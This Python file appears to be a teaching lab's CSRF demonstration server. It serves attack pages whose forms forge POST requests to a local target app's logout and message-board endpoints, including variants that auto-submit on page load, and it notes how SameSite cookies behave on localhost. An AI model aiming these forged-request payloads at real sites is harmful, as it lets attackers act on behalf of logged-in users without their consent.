import html
import os
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse


ATTACKER_HOST = os.getenv("ATTACKER_HOST", "127.0.0.1")
ATTACKER_PORT = int(os.getenv("ATTACKER_PORT", "5001"))
TARGET_BASE = os.getenv("TARGET_BASE", "http://127.0.0.1:5000")


def build_page(title, body):
    return f"""<!doctype html>
<html lang="ja">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>{html.escape(title)}</title>
    <style>
      body {{
        font-family: sans-serif;
        line-height: 1.5;
        margin: 2rem auto;
        max-width: 860px;
        padding: 0 1rem;
      }}
      .card {{
        border: 1px solid #ccc;
        border-radius: 0.4rem;
        margin: 1rem 0;
        padding: 1rem;
      }}
      code, pre {{
        background: #f4f4f4;
        padding: 0.15rem 0.3rem;
      }}
      pre {{
        overflow-x: auto;
        padding: 1rem;
      }}
      form {{
        margin: 1rem 0;
      }}
      button {{
        font: inherit;
      }}
    </style>
  </head>
  <body>
    <h1>{html.escape(title)}</h1>
    {body}
  </body>
</html>
"""


class DemoHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        routes = {
            "/": self.index_page,
            "/logout": self.logout_page,
            "/board": self.board_page,
            "/auto-logout": self.auto_logout_page,
            "/auto-board": self.auto_board_page,
        }
        handler = routes.get(parsed.path)
        if handler is None:
            self.respond(404, build_page("Not Found", "<p>Unknown page.</p>"))
            return
        self.respond(200, handler())

    def log_message(self, format, *args):
        return

    def respond(self, status_code, body):
        encoded = body.encode("utf-8")
        self.send_response(status_code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(encoded)))
        self.end_headers()
        self.wfile.write(encoded)

    def index_page(self):
        target = html.escape(TARGET_BASE)
        body = f"""
<p>CSRF demonstration server running on a separate origin.</p>
<p>Target app: <code>{target}</code></p>

<div class="card">
  <h2>How to use</h2>
  <ol>
    <li>Log in to the target app in another tab.</li>
    <li>Open one of the attack pages below.</li>
    <li>Submit the form, or use the auto-submit variant.</li>
  </ol>
</div>

<div class="card">
  <h2>Attack pages</h2>
  <ul>
    <li><a href="/logout">Logout CSRF</a></li>
    <li><a href="/auto-logout">Auto-submit logout CSRF</a></li>
    <li><a href="/board">Board post CSRF</a></li>
    <li><a href="/auto-board">Auto-submit board post CSRF</a></li>
  </ul>
</div>

<div class="card">
  <h2>Localhost note</h2>
  <p>
    Different ports are different <strong>origins</strong>, but
    <code>http://127.0.0.1:5000</code> and <code>http://127.0.0.1:5001</code>
    are still treated as the same <strong>site</strong> for SameSite purposes.
  </p>
  <p>
    If you want to demonstrate SameSite behavior, run the target on
    <code>http://127.0.0.1:5000</code> and this attacker on
    <code>http://localhost:5001</code>, or the reverse.
  </p>
</div>
"""
        return build_page("CSRF Demo Server", body)

    def logout_page(self):
        target = html.escape(TARGET_BASE)
        body = f"""
<p>This page submits a POST request to <code>{target}/logout</code>.</p>
<form action="{target}/logout" method="post">
  <button type="submit">Trigger logout</button>
</form>
"""
        return build_page("Logout CSRF", body)

    def auto_logout_page(self):
        target = html.escape(TARGET_BASE)
        body = f"""
<p>This page auto-submits a POST request to <code>{target}/logout</code>.</p>
<form id="attack" action="{target}/logout" method="post">
  <button type="submit">Trigger logout</button>
</form>
<script>
  document.getElementById("attack").submit();
</script>
"""
        return build_page("Auto Logout CSRF", body)

    def board_page(self):
        target = html.escape(TARGET_BASE)
        body = f"""
<p>This page submits a forged board post to <code>{target}/board</code>.</p>
<form action="{target}/board" method="post">
  <label>
    Title
    <input name="title" type="text" value="Forged board post">
  </label>
  <br><br>
  <label>
    Body
    <textarea name="body" rows="6" cols="60">This post was submitted from the attacker server.</textarea>
  </label>
  <br><br>
  <button type="submit">Submit forged post</button>
</form>
"""
        return build_page("Board CSRF", body)

    def auto_board_page(self):
        target = html.escape(TARGET_BASE)
        body = f"""
<p>This page auto-submits a forged board post to <code>{target}/board</code>.</p>
<form id="attack" action="{target}/board" method="post">
  <input type="hidden" name="title" value="Forged board post">
  <input type="hidden" name="body" value="This post was auto-submitted from the attacker server.">
</form>
<script>
  document.getElementById("attack").submit();
</script>
"""
        return build_page("Auto Board CSRF", body)


def main():
    server = ThreadingHTTPServer((ATTACKER_HOST, ATTACKER_PORT), DemoHandler)
    print(
        f"CSRF demo server running at http://{ATTACKER_HOST}:{ATTACKER_PORT} "
        f"targeting {TARGET_BASE}"
    )
    server.serve_forever()


if __name__ == "__main__":
    main()
